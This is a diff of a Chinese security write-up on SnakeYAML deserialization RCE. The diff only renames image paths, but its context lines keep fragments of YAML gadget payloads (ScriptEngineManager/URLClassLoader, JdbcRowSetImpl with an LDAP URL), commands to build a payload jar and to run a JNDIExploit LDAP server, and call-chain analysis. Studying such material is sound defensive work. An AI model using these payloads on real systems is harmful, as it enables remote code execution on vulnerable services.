@@ -49,7 +49,7 @@ payload
 
 - https://github.com/artsploit/yaml-payload
 
-![image-20220125143536995](snakeyaml.assets/image-20220125143536995.png)
+![image-20220125143536995](img/image-20220125143536995.png)
 
 打包成jar包
 
@@ -58,7 +58,7 @@ javac src/artsploit/AwesomeScriptEngineFactory.java
 jar -cvf yaml-payload.jar -C src/ .
 ```
 
-![image-20220125143635368](snakeyaml.assets/image-20220125143635368.png)
+![image-20220125143635368](img/image-20220125143635368.png)
 
 payload-弹计算器
 
@@ -68,7 +68,7 @@ String evilJar = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader 
 
 测试效果
 
-![image-20220125143736373](snakeyaml.assets/image-20220125143736373.png)
+![image-20220125143736373](img/image-20220125143736373.png)
 
 ##### JNDI 
 
@@ -82,7 +82,7 @@ LDAP服务
 
 - JNDIExploit
 
-![image-20220125144600810](snakeyaml.assets/image-20220125144600810.png)
+![image-20220125144600810](img/image-20220125144600810.png)
 
 payload-弹计算器
 
@@ -92,7 +92,7 @@ String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://10.10.1
 
 测试效果
 
- ![image-20220125144652166](snakeyaml.assets/image-20220125144652166.png)
+ ![image-20220125144652166](img/image-20220125144652166.png)
 
 ###### 基于 xbean-reflect
 
@@ -110,11 +110,11 @@ LDAP服务端
 java -jar .\JNDIExploit-1.4-SNAPSHOT-modified.jar -i 10.10.10.1
 ```
 
- ![image-20220124164807399](snakeyaml.assets/image-20220124164807399.png)
+ ![image-20220124164807399](img/image-20220124164807399.png)
 
 测试效果
 
- ![image-20220125145833353](snakeyaml.assets/image-20220125145833353.png)
+ ![image-20220125145833353](img/image-20220125145833353.png)
 
 ###### 基于 more gadgets
 
@@ -184,7 +184,7 @@ main:11, PayloadRunner (Deserialization.SnakeYAML)
 
 经过以下调用
 
- ![image-20220125154705633](snakeyaml.assets/image-20220125154705633.png)
+ ![image-20220125154705633](img/image-20220125154705633.png)
 
 执行到
 
@@ -259,7 +259,7 @@ private void initEngines(final ClassLoader loader) {
 
     - https://docs.oracle.com/javase/8/docs/api/java/util/ServiceLoader.html
 
-       ![image-20220125155933859](snakeyaml.assets/image-20220125155933859.png)
+       ![image-20220125155933859](img/image-20220125155933859.png)
 
 ```java
 private ServiceLoader<ScriptEngineFactory> getServiceLoader(final ClassLoader loader) {
@@ -273,7 +273,7 @@ private ServiceLoader<ScriptEngineFactory> getServiceLoader(final ClassLoader lo
 
 再经过以下调用后
 
- ![image-20220125161523743](snakeyaml.assets/image-20220125161523743.png)
+ ![image-20220125161523743](img/image-20220125161523743.png)
 
 执行到
 
@@ -316,18 +316,18 @@ private S nextService() {
 - loader：URLClassLoader
 - cn：artsploit.AwesomeScriptEngineFactory
 
-![image-20220125162031082](snakeyaml.assets/image-20220125162031082.png)
+![image-20220125162031082](img/image-20220125162031082.png)
 
  调用 c.newInstance() 方法
 
 - 反射调用无参构造方法，触发RCE 
 - 初始化静态代码块，触发RCE
 
-![image-20220125162054248](snakeyaml.assets/image-20220125162054248.png)
+![image-20220125162054248](img/image-20220125162054248.png)
 
 测试效果
 
- ![image-20220125162358464](snakeyaml.assets/image-20220125162358464.png)
+ ![image-20220125162358464](img/image-20220125162358464.png)
 
 漏洞原理
 
@@ -403,7 +403,7 @@ main:11, PayloadRunner (Deserialization.SnakeYAML)
 
 经过以下调用
 
- ![image-20220125170107361](snakeyaml.assets/image-20220125170107361.png)
+ ![image-20220125170107361](img/image-20220125170107361.png)
 
 执行到
 
@@ -411,7 +411,7 @@ main:11, PayloadRunner (Deserialization.SnakeYAML)
 
   - 获取yaml格式数据中的属性的键值对，然后调用propert.set()来set新建目标对象的属性值
 
-    ![image-20220125170643827](snakeyaml.assets/image-20220125170643827.png)
+    ![image-20220125170643827](img/image-20220125170643827.png)
 
 ```java
 protected Object constructJavaBean2ndStep(MappingNode node, Object object) {
@@ -502,7 +502,7 @@ public void set(Object object, Object value) throws Exception {
 
 - 反射调用目标类(`JndiConverter`) asText属性的setter方法(`setAsText`)
 
- ![image-20220125171530973](snakeyaml.assets/image-20220125171530973.png)
+ ![image-20220125171530973](img/image-20220125171530973.png)
 
 跟进
 
@@ -547,7 +547,7 @@ protected Object toObjectImpl(String text) {
 
 测试效果
 
-![image-20220125172659817](snakeyaml.assets/image-20220125172659817.png)
+![image-20220125172659817](img/image-20220125172659817.png)
 
 
 
